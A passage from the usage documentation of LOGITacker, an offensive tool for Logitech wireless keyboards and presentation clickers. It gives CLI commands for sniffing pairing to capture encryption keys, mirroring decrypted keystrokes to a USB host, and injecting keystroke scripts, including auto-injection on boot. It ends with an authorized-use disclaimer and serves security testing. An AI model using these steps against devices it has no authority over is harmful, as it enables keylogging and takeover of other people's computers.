version of `munifying`, once released) or to be obtained from sniffing of device pairing.

As pointed out in the previous chapter, passive-enum automatically decrypts received key reports for devices with known
key. Reading the keys from the CLI output isn't really convenient. To overcome this, LOGITacker allows forwarding of
decrypted or plain keyboard and mouse frames sniffed in passive-enum mode to its USB interface. The reports are 
translated to proper USB HID reports. Thus, the input is ultimately mirrored to the USB host which has LOGITacker 
connected.

The respective options could be enabled with the following commands:

```
LOGITacker (passive enum) $ options passive-enum pass-through-mouse on
passive-enum USB mouse pass-through: on
LOGITacker (passive enum) $ options passive-enum pass-through-keyboard on
passive-enum USB keyboard pass-through: on   
```

The result should look like in the following video, where the sniffed input of a encrypted keyboard is mirrored to 
LOGITacker's USB host: https://youtu.be/GRJ7i2J_Y80

The video additionally shows, that for Unifying device the re-pairing could be initiated using the Unifying software, in
order to sniff the link encryption key. For presentation clickers, this could currently only be achieved with `munifying`.


**WARNING: In current version, no filter could be applied on USB forwarded input. Everything entered with the sniffed
keyboard is directly forwarded to the USB keyboard interface of LOGITacker.**

## 3.6 Format description for RF reports forwarded to raw USB HID interface

t.b.d.

```
typedef struct {
    logitacker_devices_unifying_device_rf_address_t rf_address;
    uint8_t pid;
    uint8_t rf_channel;
    int8_t rssi;
    uint8_t payload_length;
    uint8_t payload_data[32]; //maximum of 32 bytes (we ignore capabilities of newer nRF5 series, as it doesn't apply to Logitech devices)

} logitacker_usb_hidraw_rf_frame_representation_t;
```

## 3.7 Headless use / Automation 

t.b.d.

Demo: https://youtu.be/nMoaXDQJNZ8


# 4 Other video usage examples (Twitter)

Note: The videos have been created throughout development and command syntax has likely changed (and will change). 
Please use tab completion and CLI inline help. All examples are included in current firmware.

## 4.1 Discover a device 

Video: https://twitter.com/mame82/status/1126038501185806336

Note: Discovery, especially of presentation clickers, has been improved since this test video.

## 4.2 Sniff pairing and eavesdropping for an encrypted keyboard

Video: https://twitter.com/mame82/status/1128036281936642051

To sniff a pairing attempt use `pai sniff run`. Successfully devices (and keys) of successfully sniffed pairing are
stored to flash automatically. The `options pair-sniff` command subset could be used to alter this behavior.

The `options store` command could be used to persistently store options changed at runtime (new option survive reboot
after storing).

If not done automatically after successful pair-sniffing, the respective keyboard has to be sniffed using
`passive_enum AA:BB:CC:DD:EE:FF`, where `AA:BB:CC:DD:EE:FF` has to be replaced by the device address obtained during
pair sniff (available via tab complete).

In order to forward (decrypted) keyboard RF frames to the USB keyboard interface, like shown in the video, the 
respective option has to be enabled with `options passive-enum pass-through-keyboard on`.

## 4.3 Inject keystrokes (encrypted device)

Video: https://twitter.com/mame82/status/1136992913714491392

The video utilizes "pair-sniffing" to obtain the device link encryption key. This, of course, isn't needed for unencrypted
devices (f.e. presentation clickers like R400, R700, R800).

The injection mode uses encrypted injection for devices with known AES key and falls back to plain injection if no
key is known or the device isn't encrypted.

In order to create, store and delete scripts use the `script` sub-command set (again inline help and tab complete).

In order to start a injection enter injection mode for a specific device with `inject target AA:BB:CC:DD:EE` where
`AA:BB:CC:DD:EE` has to be replaced by the respective device address (tab complete if already discovered).

To execute the injection, issue `inject execute`.

The behavior after injection depends on the setting of `options inject onsuccess` and `options inject onfail`.
If LOGITacker is configured to leave injection mode it has to be entered again, using `inject target AA:BB:CC:DD:EE`, in
order to do further injections.

The current injection script could be stored to flash with `script store "scriptname"`.
It is not allowed to overwrite stored scripts (same name). In order to do so, the respective script has to be deleted 
first, with `script remove "scriptname"`.

Stored scripts could be listed with `script list`.

The current script could be printed with `script show`.

To set a script as default script on boot (could be used for auto-injection), the following option has to be altered:
`options inject default-script "scriptname"`. To persist the new default-script option don't forget to run `options store`.

## 4.4 Using `altstring` feature in scripts (enter characters using ALT+NUMPAD on Windows targets)

Video demo 1 (Mouse MX Anywhere 2S): https://twitter.com/mame82/status/1139671585042915329

Video demo 2 (encrypted presentation clicker R500): https://twitter.com/mame82/status/1143093313924452353
  
# 5 DISCLAIMER

**LOGITacker** should be used for authorized testing and/or educational purposes only. 
The only exception is using it against devices or a network, owned by yourself.

I take no responsibility for the abuse of LOGITacker or any information given in
the related documents. 

**I DO NOT GRANT PERMISSIONS TO USE LOGITacker TO BREAK THE LAW.**

As LOGITacker is no production tool, it is likely that bugs occur.
I disclaim any warranty for LOGITacker, it is provided "as is".
